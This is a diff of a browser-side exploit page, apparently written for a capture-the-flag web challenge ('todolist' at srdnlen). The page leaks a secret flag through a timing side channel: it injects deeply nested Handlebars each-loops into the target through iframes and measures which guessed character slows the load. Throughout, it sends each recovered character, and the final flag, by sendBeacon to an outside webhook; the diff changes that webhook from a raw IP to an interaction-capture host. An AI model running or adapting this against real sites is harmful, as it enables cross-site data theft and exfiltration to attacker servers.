@@ -2,23 +2,27 @@
 <html><head><meta charset="utf-8"><title>.</title></head><body>
 <pre id="log"></pre>
 <script>
-const qp           = new URLSearchParams(location.search);
-const TARGET       = "https://todolist.challs.srdnlen.it";
-const WEBHOOK      = "http://135.235.137.38:80/";
-const PREFIX       = qp.get("prefix")  || "srdnlen{";
-const CHARSET      = qp.get("charset") || "abcdefghijklmnopqrstuvwxyz_0123456789}";
-const ARRLEN       = parseInt(qp.get("arrlen") || "11", 10);
-const DEPTH        = parseInt(qp.get("depth")  || "7",  10);
-const MATCH_MS     = parseInt(qp.get("match")  || "1500", 10);
-const BUDGET       = parseInt(qp.get("budget") || "54000", 10);
+const qp       = new URLSearchParams(location.search);
+const TARGET   = "https://todolist.challs.srdnlen.it";
+const WEBHOOK  = "https://e300bf190f348eaad9dbgue5r4eyyyyyb.oast.pro";
+const PREFIX   = qp.get("prefix")  || "srdnlen{";
+const CHARSET  = qp.get("charset") || "abcdefghijklmnopqrstuvwxyz_0123456789}";
+const ARRLEN   = parseInt(qp.get("arrlen") || "11", 10);
+const DEPTH    = parseInt(qp.get("depth")  || "7",  10);
+const MATCH_MS = parseInt(qp.get("match")  || "1500", 10);
+const BUDGET   = parseInt(qp.get("budget") || "54000", 10);
 
 const ARR  = JSON.stringify(Array.from({length:ARRLEN},(_,i)=>i));
 const OPEN = "{{#each @root.arr}}".repeat(DEPTH);
 const CLOS = "{{/each}}".repeat(DEPTH);
 
-function ping(msg) {
-  document.getElementById("log").textContent += msg + "\n";
-  navigator.sendBeacon(`${WEBHOOK}?log=${encodeURIComponent(msg)}`);
+const logEl = document.getElementById("log");
+
+// Only called for FLAG/DONE/MISS — not every probe
+function report(params) {
+  const url = `${WEBHOOK}?${new URLSearchParams(params).toString()}`;
+  navigator.sendBeacon(url);
+  logEl.textContent += JSON.stringify(params) + "\n";
 }
 
 function makeUrl(pos, ch) {
@@ -37,7 +41,7 @@ function probe(pos, ch) {
       if (done) return; done = true;
       clearTimeout(tid);
       try { f.src = "about:blank"; f.remove(); } catch(e) {}
-      resolve({ dt: Date.now()-t0, slow });
+      resolve(slow);
     }
     const tid = setTimeout(() => finish(true), MATCH_MS);
     f.onload  = () => finish(Date.now()-t0 >= MATCH_MS);
@@ -48,38 +52,32 @@ function probe(pos, ch) {
 }
 
 async function run() {
-  const t0 = Date.now();
-  let flag = PREFIX;
-  ping(`[start] ${flag}`);
+  const t0  = Date.now();
+  let flag  = PREFIX;
 
   for (let pos = PREFIX.length; pos < 60; pos++) {
     if (Date.now()-t0 > BUDGET) {
-      ping(`[budget] stopped at pos=${pos}`);
-      navigator.sendBeacon(`${WEBHOOK}?PARTIAL&flag=${encodeURIComponent(flag)}`);
+      report({ PARTIAL: flag });
       break;
     }
 
     let found = null;
     for (const ch of CHARSET) {
       if (Date.now()-t0 > BUDGET) break;
-      const r = await probe(pos, ch);
-      if (r.slow) { found = ch; break; }
+      if (await probe(pos, ch)) { found = ch; break; }
     }
 
     if (found) {
       flag += found;
-      ping(`[FLAG] ${flag}`);
-      navigator.sendBeacon(`${WEBHOOK}?FLAG=${encodeURIComponent(flag)}`);
+      report({ FLAG: flag });          // one request per found char
       if (found === "}") break;
     } else {
-      ping(`[MISS] pos=${pos} - not found`);
-      navigator.sendBeacon(`${WEBHOOK}?MISS&pos=${pos}&flag=${encodeURIComponent(flag)}`);
+      report({ MISS: pos, flag });
       break;
     }
   }
 
-  ping(`[DONE] ${flag}  (${Date.now()-t0}ms)`);
-  navigator.sendBeacon(`${WEBHOOK}?DONE&flag=${encodeURIComponent(flag)}`);
+  report({ DONE: flag, ms: Date.now()-t0 });
 }
 
 run();
